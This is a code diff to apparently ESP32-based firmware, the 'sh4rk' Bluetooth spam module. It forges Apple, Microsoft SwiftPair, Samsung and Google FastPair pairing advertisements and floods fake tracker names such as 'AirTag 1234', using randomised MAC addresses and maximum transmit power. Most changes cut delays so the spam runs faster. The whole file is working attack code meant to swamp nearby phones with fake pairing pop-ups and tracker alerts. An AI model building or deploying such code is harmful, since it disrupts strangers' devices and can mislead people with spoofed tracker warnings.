@@ -25,10 +25,7 @@ const char* flood_names[] = {
     "AirTag 1234", "Tile Mate 5678", "Samsung SmartTag",
     "Chipolo ONE", "Apple AirTag", "Tile Pro", "Eufy SmartTrack",
     "Nut 3", "Find My Device", "Smart Tracker", "Keys", "Wallet",
-    "Backpack", "Camera", "Laptop", "Tablet", "Headphones",
-    "LAST SEEN: NOW", "BATTERY: 15%", "LOW BATTERY", "SIGNAL LOST",
-    "FIND MY NETWORK", "NEARBY DEVICE", "UNKNOWN TRACKER",
-    "LOCATION SHARING", "SAFETY ALERT", "SECURITY NOTICE"
+    "Backpack", "Camera", "Laptop", "Tablet", "Headphones"
 };
 
 const int FLOOD_NAME_COUNT = sizeof(flood_names) / sizeof(flood_names[0]);
@@ -71,9 +68,9 @@ int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));
 BLEAdvertising *pAdvertising;
 
 void generateRandomMac(uint8_t *mac) {
-    mac[0] = 0x02 | (random(256) & 0xFC);
-    for (int i = 1; i < 6; i++) {
+    for (int i = 0; i < 6; i++) {
         mac[i] = random(256);
+        if (i == 0) { mac[i] |= 0xF0; }
     }
 }
 
@@ -127,22 +124,6 @@ uint8_t* createApplePacket(uint8_t deviceType, bool isContinuity = false) {
         memcpy(packet, device_base, 31);
         return packet;
     }
-}
-
-bool setRandomBLEAddress() {
-#if defined(CONFIG_BT_NIMBLE_ENABLED)
-    uint8_t addr[6] = {0};
-    addr[0] = 0x02 | (random(256) & 0xFC);
-    addr[1] = random(256);
-    addr[2] = random(256);
-    addr[3] = random(256);
-    addr[4] = random(256);
-    addr[5] = random(256);
-    
-    esp_err_t err = esp_ble_gap_set_rand_addr(addr);
-    return (err == ESP_OK);
-#endif
-    return false;
 }
 
 BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int specific_index = -1) {
@@ -223,6 +204,7 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int spe
         }
         
         case SamsungWatch: {
+            // Fixed Samsung format
             uint8_t samsungPayload[14] = {
                 0x02, 0x01, 0x06,
                 0x03, 0x03, 0x6F, 0xFD,
@@ -240,6 +222,7 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int spe
         }
         
         case SamsungBuds: {
+            // Fixed Buds format
             const char* budsId = getRandomBudsId();
             uint8_t deviceId[3];
             hexStringToBytes(budsId, deviceId, 3);
@@ -261,6 +244,7 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int spe
         }
         
         case SamsungRaw: {
+            // Alternative Samsung format
             uint8_t rawPayload[26] = {
                 0x02, 0x01, 0x06,
                 0x03, 0x03, 0x6F, 0xFD,
@@ -309,85 +293,50 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int spe
     return AdvData;
 }
 
-void executeSpam(EBLEPayloadType type, int delayMs = 20, int specific_index = -1) {
+void executeSpam(EBLEPayloadType type, int delayMs = 15, int specific_index = -1) {
     uint8_t macAddr[6];
-    
-    macAddr[0] = 0x02 | (random(256) & 0xFC);
-    for (int i = 1; i < 6; i++) {
-        macAddr[i] = random(256);
-    }
-    
+    generateRandomMac(macAddr);
     esp_base_mac_addr_set(macAddr);
-    setRandomBLEAddress();
-    
     BLEDevice::init("");
     vTaskDelay(5 / portTICK_PERIOD_MS);
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-    
     pAdvertising = BLEDevice::getAdvertising();
     BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type, specific_index);
-    
-    uint32_t random_uuid = random() & 0xFFFF;
-    char uuid_str[10];
-    snprintf(uuid_str, sizeof(uuid_str), "%04X", random_uuid);
-    String full_uuid = String("0000") + uuid_str + "-0000-1000-8000-00805f9b34fb";
-    pAdvertising->addServiceUUID(BLEUUID(full_uuid.c_str()));
-    
+    NimBLEUUID uuid((uint32_t)(random() & 0xFFFFFF));
+    pAdvertising->addServiceUUID(uuid);
     pAdvertising->setAdvertisementData(advertisementData);
-    
-#ifdef NIMBLE_V2_PLUS
-    pAdvertising->setAddress(BLEAddress(macAddr, BLE_ADDR_RANDOM));
-#endif
-    
     pAdvertising->start();
     vTaskDelay(delayMs / portTICK_PERIOD_MS);
     pAdvertising->stop();
     vTaskDelay(5 / portTICK_PERIOD_MS);
-    
 #if defined(CONFIG_IDF_TARGET_ESP32C5)
     esp_bt_controller_deinit();
 #else
-    BLEDevice::deinit(true);
+    BLEDevice::deinit();
 #endif
 }
 
-void executeCustomSpam(String spamName, bool isFloodMode = false) {
+void executeCustomSpam(String spamName) {
     uint8_t macAddr[6];
-    
-    macAddr[0] = 0x02 | (esp_random() & 0xFC);
-    for (int i = 1; i < 6; i++) {
-        macAddr[i] = esp_random() & 0xFF;
-    }
-    
+    for (int i = 0; i < 6; i++) { macAddr[i] = esp_random() & 0xFF; }
     esp_base_mac_addr_set(macAddr);
-    setRandomBLEAddress();
-    
-    BLEDevice::init("");
+    BLEDevice::init("sh4rk");
     vTaskDelay(5 / portTICK_PERIOD_MS);
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-    
     pAdvertising = BLEDevice::getAdvertising();
     BLEAdvertisementData advertisementData = BLEAdvertisementData();
     advertisementData.setFlags(0x06);
     advertisementData.setName(spamName.c_str());
-    
-    uint32_t service_id = esp_random() & 0xFFFF;
-    char service_str[10];
-    snprintf(service_str, sizeof(service_str), "%04X", service_id);
-    String service_uuid = String("0000") + service_str + "-0000-1000-8000-00805f9b34fb";
-    pAdvertising->addServiceUUID(BLEUUID(service_uuid.c_str()));
-    
+    pAdvertising->addServiceUUID(BLEUUID("1812"));
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->start();
-    
-    vTaskDelay(isFloodMode ? 10 : 20 / portTICK_PERIOD_MS);
+    vTaskDelay(15 / portTICK_PERIOD_MS);  // Faster!
     pAdvertising->stop();
-    
     vTaskDelay(5 / portTICK_PERIOD_MS);
 #if defined(CONFIG_IDF_TARGET_ESP32C5)
     esp_bt_controller_deinit();
 #else
-    BLEDevice::deinit(true);
+    BLEDevice::deinit();
 #endif
 }
 
@@ -397,16 +346,12 @@ void aj_adv(int ble_choice) {
     String spamName = "";
     static int samsung_index = 0;
     static int spam_all_index = 0;
-    static int flood_name_index = 0;
     
-    if (ble_choice == 7) { 
-        spamName = keyboard("", 10, "Name to spam"); 
-    }
-    
+    if (ble_choice == 7) { spamName = keyboard("", 10, "Name to spam"); }
     timer = millis();
     
     while (1) {
-        if (millis() - timer > (ble_choice == 8 ? 30 : 100)) {
+        if (millis() - timer > (ble_choice == 8 ? 20 : 50)) {  // Faster for NameFlood
             switch (ble_choice) {
                 case 0:
                     displayTextLine("Apple iOS (" + String(count) + ")");
@@ -414,34 +359,34 @@ void aj_adv(int ble_choice) {
                     break;
                 case 1:
                     displayTextLine("SwiftPair (" + String(count) + ")");
-                    executeSpam(Microsoft, 20);
+                    executeSpam(Microsoft, 15);
                     break;
                 case 2:
                     displayTextLine("Samsung Watch (" + String(count) + ")");
-                    executeSpam(SamsungWatch, 30, samsung_index);
+                    executeSpam(SamsungWatch, 15, samsung_index);
                     samsung_index = (samsung_index + 1) % 26;
                     break;
                 case 3:
                     displayTextLine("Samsung Buds (" + String(count) + ")");
-                    executeSpam(SamsungBuds, 30);
+                    executeSpam(SamsungBuds, 15);
                     break;
                 case 4:
                     displayTextLine("Samsung Raw (" + String(count) + ")");
-                    executeSpam(SamsungRaw, 30);
+                    executeSpam(SamsungRaw, 15);
                     break;
                 case 5:
                     displayTextLine("Google FastPair (" + String(count) + ")");
-                    executeSpam(GoogleFastPair, 20);
+                    executeSpam(GoogleFastPair, 15);
                     break;
                 case 6:
                     displayTextLine("Spam All (" + String(count) + ")");
                     switch(spam_all_index % 6) {
-                        case 0: executeSpam(AppleIOS, 40); break;
-                        case 1: executeSpam(SamsungWatch, 40, random(26)); break;
-                        case 2: executeSpam(SamsungBuds, 40); break;
-                        case 3: executeSpam(SamsungRaw, 40); break;
-                        case 4: executeSpam(Microsoft, 40); break;
-                        case 5: executeSpam(GoogleFastPair, 40); break;
+                        case 0: executeSpam(AppleIOS, 25); break;
+                        case 1: executeSpam(SamsungWatch, 25, random(26)); break;
+                        case 2: executeSpam(SamsungBuds, 25); break;
+                        case 3: executeSpam(SamsungRaw, 25); break;
+                        case 4: executeSpam(Microsoft, 25); break;
+                        case 5: executeSpam(GoogleFastPair, 25); break;
                     }
                     spam_all_index++;
                     break;
@@ -451,14 +396,7 @@ void aj_adv(int ble_choice) {
                     break;
                 case 8:
                     displayTextLine("Name Flood (" + String(count) + ")");
-                    if(flood_name_index < FLOOD_NAME_COUNT) {
-                        String floodName = String(flood_names[flood_name_index]);
-                        executeCustomSpam(floodName, true);
-                        flood_name_index++;
-                        if(flood_name_index >= FLOOD_NAME_COUNT) {
-                            flood_name_index = 0;
-                        }
-                    }
+                    executeSpam(NameFlood, 10);  // Fastest!
                     break;
             }
             count++;
@@ -478,6 +416,6 @@ void aj_adv(int ble_choice) {
 #if defined(CONFIG_IDF_TARGET_ESP32C5)
     esp_bt_controller_deinit();
 #else
-    BLEDevice::deinit(true);
+    BLEDevice::deinit();
 #endif
 }
